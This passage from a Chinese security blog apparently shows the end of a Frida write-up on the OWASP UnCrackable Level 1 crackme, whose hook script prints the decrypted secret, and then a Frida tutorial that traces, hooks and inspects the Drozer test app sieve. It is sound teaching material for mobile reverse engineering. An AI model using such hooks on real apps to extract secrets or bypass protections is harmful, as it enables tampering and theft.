<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(a.a(v0)) &#123; <span class="comment">// v0为输入的密码</span></span><br><span class="line">    v1.setTitle(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">    v1.setMessage(<span class="string">&quot;This is the correct secret.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面是<code>sg.vantagepoint.uncrackable1.a</code>类的反编译结果：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">a</span><span class="params">(String arg6)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] v0;</span><br><span class="line">        String v2 = <span class="string">&quot;8d127684cbc37c17616d806cf50473cc&quot;</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] v3 = Base64.decode(<span class="string">&quot;5UJiFctbmgbDoLXmpL12mkno8HT4Lv8dlat8FxR2GOc=&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            v0 = sg.vantagepoint.a.a.a(a.b(v2), v3);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception v2_1) &#123;</span><br><span class="line">            Log.d(<span class="string">&quot;CodeCheck&quot;</span>, <span class="string">&quot;AES error:&quot;</span> + v2_1.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">boolean</span> v0_1 = arg6.equals(<span class="keyword">new</span> String(v0)) ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">return</span> v0_1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] b(String arg7) &#123;</span><br><span class="line">        <span class="keyword">int</span> v1 = <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">int</span> v2 = arg7.length();</span><br><span class="line">        <span class="keyword">byte</span>[] v3 = <span class="keyword">new</span> <span class="keyword">byte</span>[v2 / <span class="number">2</span>];</span><br><span class="line">        <span class="keyword">int</span> v0;</span><br><span class="line">        <span class="keyword">for</span>(v0 = <span class="number">0</span>; v0 &lt; v2; v0 += <span class="number">2</span>) &#123;</span><br><span class="line">            v3[v0 / <span class="number">2</span>] = ((<span class="keyword">byte</span>)((Character.digit(arg7.charAt(v0), v1) &lt;&lt; <span class="number">4</span>) + Character.digit(arg7.charAt(v0 + <span class="number">1</span>), v1)));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> v3;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>a</code>方法的最后，<code>arg6.equals</code>比较输入的字符串和<code>String(v0)</code>是否相等，v0是<code>sg.vantagepoint.a.a</code>类的<code>a</code>方法返回的值（字节数组的形式），所以要知道正确的输入，只要hook <code>a</code>方法，将其返回值转换为可读字符串并打印到控制台即可。  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">aaClass = Java.use(<span class="string">&quot;sg.vantagepoint.a.a&quot;</span>);</span><br><span class="line">aaClass.a.implementation = <span class="function"><span class="keyword">function</span>(<span class="params">arg1, arg2</span>) </span>&#123;</span><br><span class="line">    retval = <span class="built_in">this</span>.a(arg1, arg2);</span><br><span class="line">    password = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; retval.length; i++) &#123;</span><br><span class="line">        password += <span class="built_in">String</span>.fromCharCode(retval[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] Decrypted: &quot;</span> + password);</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] sg.vantagepoint.a.a.a modified&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>将上述代码和之前的代码放到一起组成完整的脚本后运行，等到代码注入成功，点击Root Detected对话框OK按钮，在文本框中随意输入字符，点击VERIFY按钮：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ frida -U -l uncrackable1.js sg.vantagepoint.uncrackable1</span><br><span class="line">...</span><br><span class="line">[*] onClick handler modified</span><br><span class="line">[*] sg.vantagepoint.a.a.a modified</span><br><span class="line">[*] onClick called</span><br><span class="line">[*] Decrypted: I want to believe</span><br></pre></td></tr></table></figure>
<p>控制台上即可看到所需的正确输入：<code>I want to believe</code>。将字符串输入文本框中：<br><img src="/images/frida/success.png"><br><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://bobao.360.cn/learning/detail/3634.html">http://bobao.360.cn/learning/detail/3634.html</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2017/05/05/Frida%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/05/05/Frida%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/" class="post-title-link" itemprop="url">Frida使用说明</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2017-05-05 22:22:23" itemprop="dateCreated datePublished" datetime="2017-05-05T22:22:23+08:00">2017-05-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Frida是一个动态代码插桩框架，这里的介绍主要以应用在Android平台应用程序上。动态二进制插桩（DBI）是将外部代码注入到现有的正在运行的二进制文件中，从而让它执行额外操作。DBI可以：</p>
<ul>
<li>访问进程内存</li>
<li>在应用程序运行时覆盖函数</li>
<li>从导入的类调用函数</li>
<li>在堆上查找对象实例并使用</li>
<li>Hook、跟踪和拦截函数等</li>
</ul>
<p>调试器也能完成相应工作，不过非常麻烦，比如各种反调试。</p>
<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>1.操作系统 MacOS（Linux和Windows也可以）<br>2.主机安装Frida：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo pip install frida</span><br><span class="line">...</span><br><span class="line">Successfully installed frida-10.0.9</span><br></pre></td></tr></table></figure>
<p>3.下载服务器二进制文件<a target="_blank" rel="noopener" href="https://github.com/frida/frida/releases">frida-server</a><br>我下载的是frida-server-10.0.9-android-arm.xz，要注意的是frida-server文件要与安装的frida是同一个版本。<br>这里说明一下我用的是nexus5 Android4.4，但是发现后面的实验所需Android的版本较高，改为使用SDK自带的Emulator，新建了一个Android7.0的虚拟机。</p>
<h2 id="Frida基础"><a href="#Frida基础" class="headerlink" title="Frida基础"></a>Frida基础</h2><p>Frida可以在Android应用程序中注入JavaScript或自己的库代码。从版本9开始Frida不再使用Google的V8 Javascript运行时，而是使用其内部的Duktape运行时。启动模拟器或连接设备：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ adb devices</span><br><span class="line">List of devices attached</span><br><span class="line">emulator-5554    device</span><br></pre></td></tr></table></figure>
<p>安装并启动frida-server：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ adb push frida-server-10.0.1-android-arm &#x2F;data&#x2F;local&#x2F;tmp&#x2F;frida-server</span><br><span class="line">$ adb shell</span><br><span class="line">generic:&#x2F; # cd &#x2F;data&#x2F;local&#x2F;tmp</span><br><span class="line">generic:&#x2F;data&#x2F;local&#x2F;tmp # chmod 755 frida-server</span><br><span class="line">generic:&#x2F;data&#x2F;local&#x2F;tmp # .&#x2F;frida-server</span><br></pre></td></tr></table></figure>
<p>查看frida-server是否启动成功：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ frida-ps -U</span><br><span class="line"> PID  Name</span><br><span class="line">----  --------------------------------------------------</span><br><span class="line"> 698  adbd</span><br><span class="line">2113  android.process.acore</span><br><span class="line">2247  android.process.media</span><br><span class="line"> 700  audioserver</span><br><span class="line"> 701  cameraserver</span><br><span class="line">3426  com.android.gallery3d</span><br><span class="line">1261  com.android.inputmethod.latin</span><br><span class="line">1989  com.android.launcher3</span><br><span class="line">3543  com.android.managedprovisioning</span><br><span class="line">2720  com.android.phone</span><br><span class="line">1771  com.android.printspooler</span><br><span class="line">3122  com.android.providers.calendar</span><br><span class="line">1971  com.android.systemui</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>-U表示USB，允许Frida检查USB设备。这时将看到一个进程列表。现在可以通过Frida hook到任何一个进程，并对其进行插桩了。</p>
<h3 id="Hook应用程序函数调用"><a href="#Hook应用程序函数调用" class="headerlink" title="Hook应用程序函数调用"></a>Hook应用程序函数调用</h3><p>这里我先在模拟器上安装了一个Drozer的测试应用程序<a target="_blank" rel="noopener" href="https://github.com/mwrlabs/drozer/releases/download/2.3.4/sieve.apk">sieve</a>。使用frida-trace可以跟踪由sieve使用的特定调用：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ frida-trace -i open -U -f com.mwr.example.sieve</span><br><span class="line">Instrumenting functions...</span><br><span class="line">open: Loaded handler at &quot;&#x2F;Users&#x2F;fan&#x2F;__handlers__&#x2F;libc.so&#x2F;open.js&quot;</span><br><span class="line">Started tracing 1 function. Press Ctrl+C to stop.</span><br><span class="line">           &#x2F;* TID 0x1284 *&#x2F;</span><br><span class="line">   206 ms  open()</span><br><span class="line">           &#x2F;* TID 0x129a *&#x2F;</span><br><span class="line">   221 ms  open()</span><br><span class="line">           &#x2F;* TID 0x1284 *&#x2F;</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>
<p>frida-trace会生成一个Javascript文件（第二行输出），然后Frida将其注入到进程中，并hook特定调用（libc.so中的open函数）。修改生成的Javascript文件<code>open.js</code>可以输出open函数的调用参数。  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">onEnter: <span class="function"><span class="keyword">function</span> (<span class="params">log, args, state</span>) </span>&#123;</span><br><span class="line">    log(<span class="string">&quot;open(&quot;</span> + <span class="string">&quot;pathname=&quot;</span> + args[<span class="number">0</span>] + <span class="string">&quot;, flags=&quot;</span> + args[<span class="number">1</span>] + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">&#125;,</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>再次运行应用程序会输出如下信息：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">frida-trace -i open -U -f com.mwr.example.sieve</span><br><span class="line">Instrumenting functions...</span><br><span class="line">open: Loaded handler at &quot;&#x2F;Users&#x2F;fan&#x2F;__handlers__&#x2F;libc.so&#x2F;open.js&quot;</span><br><span class="line">Started tracing 1 function. Press Ctrl+C to stop.</span><br><span class="line">           &#x2F;* TID 0x1383 *&#x2F;</span><br><span class="line">   222 ms  open(pathname&#x3D;0xa7137e65, flags&#x3D;0x80002)</span><br><span class="line">           &#x2F;* TID 0x1399 *&#x2F;</span><br><span class="line">   255 ms  open(pathname&#x3D;0xa662cc2c, flags&#x3D;0x2)</span><br><span class="line">           &#x2F;* TID 0x139a *&#x2F;</span><br><span class="line">   267 ms  open(pathname&#x3D;0xa662cc2c, flags&#x3D;0x2)</span><br><span class="line">           &#x2F;* TID 0x1383 *&#x2F;</span><br><span class="line">   286 ms  open(pathname&#x3D;0xa662c6df, flags&#x3D;0x2)</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>
<p>再对<code>open.js</code>做修改，让其输出打开文件路径的文本形式，而不是存储单元的地址。我们可以直接访问内存，这里可以参考Frida的<a target="_blank" rel="noopener" href="https://www.frida.re/docs/javascript-api/">Javascript API</a>。  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">onEnter: <span class="function"><span class="keyword">function</span> (<span class="params">log, args, state</span>) </span>&#123;</span><br><span class="line">    log(<span class="string">&quot;open(&quot;</span> + <span class="string">&quot;pathname=&quot;</span> + Memory.readUtf8String(args[<span class="number">0</span>]) + <span class="string">&quot;, flags=&quot;</span> + args[<span class="number">1</span>] + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">&#125;,</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>再次运行程序输出如下：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ frida-trace -i open -U -f com.mwr.example.sieve</span><br><span class="line">Instrumenting functions...</span><br><span class="line">open: Loaded handler at &quot;&#x2F;Users&#x2F;fan&#x2F;__handlers__&#x2F;libc.so&#x2F;open.js&quot;</span><br><span class="line">Started tracing 1 function. Press Ctrl+C to stop.</span><br><span class="line">           &#x2F;* TID 0x1434 *&#x2F;</span><br><span class="line">   272 ms  open(pathname&#x3D;&#x2F;dev&#x2F;binder, flags&#x3D;0x80002)</span><br><span class="line">           &#x2F;* TID 0x1449 *&#x2F;</span><br><span class="line">   286 ms  open(pathname&#x3D;&#x2F;dev&#x2F;ashmem, flags&#x3D;0x2)</span><br><span class="line">           &#x2F;* TID 0x144a *&#x2F;</span><br><span class="line">   296 ms  open(pathname&#x3D;&#x2F;dev&#x2F;ashmem, flags&#x3D;0x2)</span><br><span class="line">           &#x2F;* TID 0x1434 *&#x2F;</span><br><span class="line">   300 ms  open(pathname&#x3D;&#x2F;sys&#x2F;qemu_trace&#x2F;process_name, flags&#x3D;0x2)</span><br><span class="line">   428 ms  open(pathname&#x3D;&#x2F;dev&#x2F;alarm, flags&#x3D;0x0)</span><br><span class="line">   431 ms  open(pathname&#x3D;&#x2F;sys&#x2F;qemu_trace&#x2F;process_name, flags&#x3D;0x2)</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>

<h3 id="Frida命令行接口frida-cli"><a href="#Frida命令行接口frida-cli" class="headerlink" title="Frida命令行接口frida-cli"></a>Frida命令行接口frida-cli</h3><p>启动sieve应用，并将生成的进程的任务留给Frida：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ frida -U --no-pause -f com.mwr.example.sieve</span><br><span class="line">     ____</span><br><span class="line">    &#x2F; _  |   Frida 10.0.1 - A world-class dynamic instrumentation framework</span><br><span class="line">   | (_| |</span><br><span class="line">    &gt; _  |   Commands:</span><br><span class="line">   &#x2F;_&#x2F; |_|       help      -&gt; Displays the help system</span><br><span class="line">   . . . .       object?   -&gt; Display information about &#39;object&#39;</span><br><span class="line">   . . . .       exit&#x2F;quit -&gt; Exit</span><br><span class="line">   . . . .</span><br><span class="line">   . . . .   More info at http:&#x2F;&#x2F;www.frida.re&#x2F;docs&#x2F;home&#x2F;</span><br><span class="line">Spawned &#96;com.mwr.example.sieve&#96;. Resuming main thread!</span><br><span class="line">[USB::Android Emulator 5554::[&#39;com.mwr.example.sieve&#39;]]-&gt;</span><br></pre></td></tr></table></figure>
<p>这样就能得到一个shell，可以使用Frida的<code>Javascrip API</code>写命令了。通过Tab可以查看和补全命令，Frida也提供了详细的API文档。对于Android，查看<code>Javascript API</code>的<a target="_blank" rel="noopener" href="https://www.frida.re/docs/javascript-api/#java">Java部分</a>。下面详细讨论一个访问Java对象的Javascript包装器，在和Android应用程序交互的时候，这是一种更便捷的方法。不同于hook libc函数，我们可以直接使用Java函数和对象。<br>列出加载的类：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[USB::Android Emulator 5554::[&#39;com.mwr.example.sieve&#39;]]-&gt; Java.perform(function()&#123;Java.enumerateLoadedClasses(&#123;&quot;onMatch&quot;:function(className)&#123; console.log(className) &#125;, &quot;onComplete&quot;:function()&#123;&#125;&#125;)&#125;)</span><br><span class="line">...</span><br><span class="line">com.mwr.example.sieve.AuthServiceConnector$MessageHandler</span><br><span class="line">com.mwr.example.sieve.WelcomeActivity</span><br><span class="line">com.mwr.example.sieve.PWDBHelper</span><br><span class="line">com.mwr.example.sieve.AuthService</span><br><span class="line">com.mwr.example.sieve.DBContentProvider</span><br><span class="line">com.mwr.example.sieve.AuthServiceConnector$ResponseListener</span><br><span class="line">com.mwr.example.sieve.MainLoginActivity</span><br><span class="line">com.mwr.example.sieve.FileBackupProvider</span><br><span class="line">com.mwr.example.sieve.AuthServiceConnector</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>这里输入了一个比较长的命令，是一些嵌套的函数代码。首先，输入的代码必须包装在<code>Java.perform(function()&#123;...&#125;)</code>中，这是Frida API硬性要求。<br>下面是在<code>Java.perform</code>包装器中插入的函数体：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Java.enumerateLoadedClasses(</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="string">&quot;onMatch&quot;</span>: <span class="function"><span class="keyword">function</span>(<span class="params">className</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(className)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;onComplete&quot;</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>使用Frida API的<code>Java.enumerateLoadedClasses</code>枚举所有加载的类，并使用<code>console.log</code>将匹配的类输出到控制台。这种回调对象在Frida中是一种非常常见 的模式。你可以提供一个回调对象，形式如下：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;onMatch&quot;:function(arg1, ...)&#123;...&#125;,</span><br><span class="line">&quot;onComplete&quot;:function()&#123;&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当Frida找到符合要求的匹配项时，就会使用一个或多个参数调用<code>onMatch</code>；当Frida完成匹配工作时，就会调用<code>onComplete</code>。</p>
<h2 id="Frida加载外部脚本"><a href="#Frida加载外部脚本" class="headerlink" title="Frida加载外部脚本"></a>Frida加载外部脚本</h2><p>下面通过加载一个外部脚本来覆盖一个函数，首先，将下面的代码保存到一个脚本文件中，例如<code>sieve.js</code>:  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="keyword">var</span> Activity = Java.use(<span class="string">&quot;android.app.Activity&quot;</span>);</span><br><span class="line">   Activity.onResume.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="built_in">console</span>.log(<span class="string">&quot;[*] onResume() got called!&quot;</span>);</span><br><span class="line">       <span class="built_in">this</span>.onResume();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>这段代码将会覆盖<code>android.app.Activity</code>类的<code>onResume</code>函数。这里调用了<code>Java.use</code>来接收<code>android.app.Activity</code>类的包装对象，并访问其<code>onResume</code>函数的<code>implementation</code>属性，来重新实现。在新的函数体中，通过<code>this.onResume</code>调用原来的<code>onResume</code>函数，所以应用程序可以正常执行。<br>打开sieve应用，通过<code>-l</code>选项来注入这个脚本：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ frida -U -l sieve.js com.mwr.example.sieve</span><br></pre></td></tr></table></figure>
<p>一旦触发onResume，例如切换出sieve再切换回来，就会在shell中输出：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[*] onResume() got called!</span><br></pre></td></tr></table></figure>
<p>通过覆盖应用程序中的函数，就可以控制应用程序的行为。</p>
<blockquote>
<p>当模拟器速度较慢时，Frida会出现超时。为了防止这种情况，可以将脚本封装到<code>setImmediate</code>中。修改脚本文件后，<code>setImmediate</code>将自动重新运行脚本。<code>setImmediate</code>运行脚本是在后台，所以会立刻得到一个cli，稍等脚本处理完，就会输出结果。</p>
</blockquote>
<p>下面利用<code>Java.choose</code>查找堆中已经实例化的对象：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">setImmediate(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] Starting script&quot;</span>);</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        Java.choose(<span class="string">&quot;android.widget.EditText&quot;</span>, &#123;</span><br><span class="line">        <span class="string">&quot;onMatch&quot;</span>:<span class="function"><span class="keyword">function</span>(<span class="params">instance</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;[*] Instance found&quot;</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;onComplete&quot;</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;[*] Finished heap search&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>运行脚本：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ frida -U -l sieve2.js com.mwr.example.sieve</span><br><span class="line">...</span><br><span class="line">[*] Starting script</span><br><span class="line">[USB::Android Emulator 5554::com.mwr.example.sieve]-&gt; [*] Instance found</span><br><span class="line">[*] Instance found</span><br><span class="line">[*] Instance found</span><br><span class="line">[*] Instance found</span><br><span class="line">[*] Finished heap search</span><br></pre></td></tr></table></figure>
<p>在堆上找到了四个<code>android.widget.EditText</code>，可以调用这些实例对象方法。这里只是为<code>console.log</code>输出添加<code>instance.toString()</code>。由于使用了<code>setImmediate</code>，所以只要修改脚本，Frida就会重新运行它：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">setImmediate(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] Starting script&quot;</span>);</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        Java.choose(<span class="string">&quot;android.widget.EditText&quot;</span>, &#123;</span><br><span class="line">        <span class="string">&quot;onMatch&quot;</span>:<span class="function"><span class="keyword">function</span>(<span class="params">instance</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;[*] Instance found: &quot;</span> + instance.toString());</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;onComplete&quot;</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;[*] Finished heap search&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>输出结果：  </p>
